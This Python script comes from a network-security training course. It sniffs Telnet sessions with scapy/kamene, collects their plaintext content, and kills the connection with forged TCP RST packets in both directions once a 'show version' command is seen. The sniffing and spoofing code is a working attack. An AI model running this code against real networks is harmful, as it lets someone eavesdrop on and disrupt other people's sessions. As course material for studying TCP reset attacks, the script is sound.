#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a

import logging
import warnings
import re
import sys
import argparse
from pathlib import Path
from kamene.all import TCP, IP, Ether, sendp, sniff, wrpcap, Raw

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("TelnetRST")
logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错
warnings.filterwarnings("ignore")

# 设置路径
current_file = Path(__file__)
current_root = current_file.parent
root_root = current_file.parent.parent.parent
sys.path.append(str(root_root))

from tools.scapy_iface import scapy_iface
from net_13_traffic_analysis.scapy_traffic_analysis.scapy_0_pcap_dir import pcap_dir

# 使用全局变量，与第7部分保持一致
global global_if

class TelnetMonitor:
    """Telnet会话监控和RST攻击类
    
    监控Telnet会话，检测特定命令，并发送RST包重置连接
    """
    
    def __init__(self, interface, filter_str, timeout=None, debug=False):
        """初始化Telnet监控器

        Args:
            interface: 网络接口名称
            filter_str: BPF过滤表达式
            timeout: 捕获超时时间，None表示一直捕获
            debug: 是否启用调试模式
        """
        # 使用全局变量，与第7部分保持一致
        global global_if
        global_if = scapy_iface(interface)
        self.interface = global_if
        self.filter_str = filter_str
        self.timeout = timeout
        self.debug = debug
        self.telnet_data = b''
        self.packets = []

    def reset_tcp(self, pkt):
        """发送TCP RST包重置连接

        Args:
            pkt: 触发重置的数据包
        """
        source_mac = pkt[Ether].fields['src']
        destination_mac = pkt[Ether].fields['dst']
        source_ip = pkt[IP].fields['src']
        destination_ip = pkt[IP].fields['dst']
        source_port = pkt[TCP].fields['sport']
        destination_port = pkt[TCP].fields['dport']
        seq_sn = pkt[TCP].fields['seq']
        ack_sn = pkt[TCP].fields['ack']

        # 构造双向RST包，与第7部分保持一致
        a = Ether(src=source_mac, dst=destination_mac) / IP(src=source_ip, dst=destination_ip) / TCP(dport=destination_port,
                                                                                                 sport=source_port,
                                                                                                 flags=4, seq=seq_sn)
        b = Ether(src=destination_mac, dst=source_mac) / IP(src=destination_ip, dst=source_ip) / TCP(dport=source_port,
                                                                                                 sport=destination_port,
                                                                                                 flags=4, seq=ack_sn)
        # 使用全局变量global_if，与第7部分保持一致
        sendp(a,
            iface=global_if,
            verbose=False)
        sendp(b,
            iface=global_if,
            verbose=False)
        return True

    def packet_callback(self, pkt):
        """处理捕获的数据包

        Args:
            pkt: 捕获的数据包
        """
        # 完全按照第7部分的telnet_monitor_callback实现
        try:
            if pkt.getlayer(TCP).fields['dport'] == 23:
                if pkt.getlayer(Raw).fields['load'].decode():
                    self.telnet_data = self.telnet_data + pkt.getlayer(Raw).fields['load']  # 不断提取数据,拼接到telnet_data
        except Exception:
            pass

        # 检查是否包含敏感命令，使用与第7部分相同的方式
        if re.match(br'(.*\r\n.*)*sh.*\s+ver.*', self.telnet_data):  # 如果出现show ver字段,就Rest踢掉此会话
            logger.warning(f"检测到敏感命令 'show version'，重置连接")
            self.reset_tcp(pkt)

    def start(self):
        """开始捕获和监控Telnet流量"""
        logger.info(f"开始在接口 {self.interface} 上捕获流量，过滤条件: {self.filter_str}")
        
        try:
            # 捕获数据包，与第7部分保持一致
            self.packets = sniff(
                prn=self.packet_callback,
                filter=self.filter_str,
                store=1,
                timeout=self.timeout,
                iface=self.interface
            )
            
            # 保存捕获的数据包，使用与第7部分相同的文件名
            pcap_file = pcap_dir + "temp.cap"
            wrpcap(pcap_file, self.packets)
            logger.info(f"捕获了 {len(self.packets)} 个数据包，已保存到 {pcap_file}")
            
            # 打印捕获的Telnet数据
            print(self.telnet_data)
                
        except KeyboardInterrupt:
            logger.info("用户中断捕获")
            # 保存已捕获的数据包
            if self.packets:
                pcap_file = pcap_dir + "temp.cap"
                wrpcap(pcap_file, self.packets)
                logger.info(f"已保存 {len(self.packets)} 个数据包到 {pcap_file}")
        except Exception as e:
            logger.error(f"捕获过程中出错: {e}")



if __name__ == "__main__":
    # 直接传入参数，类似于第7部分
    monitor = TelnetMonitor(
        interface="ens35",
        filter_str="tcp port 23 and ip host 196.21.5.211",
        timeout=10,
        debug=False
    )
    
    # 启动监控
    monitor.start() 